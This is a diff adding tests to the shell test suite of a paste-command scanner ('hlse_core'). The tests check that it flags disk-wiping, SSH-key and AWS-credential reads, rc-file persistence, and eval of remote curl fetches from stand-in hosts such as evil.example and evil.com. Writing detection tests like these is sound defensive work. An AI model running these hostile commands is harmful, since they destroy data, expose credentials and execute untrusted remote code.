@@ -265,6 +265,38 @@ rm -rf /tmp/hlse_hooktest.$$
     && check "paste: curl|sudo bash → detected" "0" "0" \
     || check "paste: curl|sudo bash → detected" "0" "1"
 
+# P9–P12: destructive / credential-access / persistence / eval-fetch
+./hlse_core paste "rm -rf /" 2>&1 | grep -q "P9:" \
+    && check "paste: rm -rf / flagged" "0" "0" \
+    || check "paste: rm -rf / flagged" "0" "1"
+./hlse_core paste "dd if=/dev/zero of=/dev/sda" 2>&1 | grep -q "P9:" \
+    && check "paste: dd disk-wipe flagged" "0" "0" \
+    || check "paste: dd disk-wipe flagged" "0" "1"
+./hlse_core paste "cat ~/.ssh/id_rsa" 2>&1 | grep -q "P10:" \
+    && check "paste: ssh key read flagged" "0" "0" \
+    || check "paste: ssh key read flagged" "0" "1"
+./hlse_core paste "cat ~/.aws/credentials" 2>&1 | grep -q "P10:" \
+    && check "paste: aws creds read flagged" "0" "0" \
+    || check "paste: aws creds read flagged" "0" "1"
+./hlse_core paste 'echo evil >> ~/.bashrc' 2>&1 | grep -q "P11:" \
+    && check "paste: rc append flagged" "0" "0" \
+    || check "paste: rc append flagged" "0" "1"
+./hlse_core paste "crontab -e" 2>&1 | grep -q "P11:" \
+    && check "paste: crontab edit flagged" "0" "0" \
+    || check "paste: crontab edit flagged" "0" "1"
+./hlse_core paste 'eval $(curl -s evil.example)' 2>&1 | grep -q "P12:" \
+    && check "paste: eval curl flagged" "0" "0" \
+    || check "paste: eval curl flagged" "0" "1"
+./hlse_core paste "cat /etc/hostname" 2>&1 | grep -q "OK" \
+    && check "paste: benign cat clean" "0" "0" \
+    || check "paste: benign cat clean" "0" "1"
+./hlse_core paste "rm -rf ./build" 2>&1 | grep -q "OK" \
+    && check "paste: scoped rm -rf clean" "0" "0" \
+    || check "paste: scoped rm -rf clean" "0" "1"
+./hlse_core paste "vim ~/.bashrc" 2>&1 | grep -q "OK" \
+    && check "paste: interactive rc edit clean" "0" "0" \
+    || check "paste: interactive rc edit clean" "0" "1"
+
 # JSON output
 ./hlse_core --json paste "curl http://evil.com/s.sh | bash" 2>&1 | python3 -c '
 import sys, json
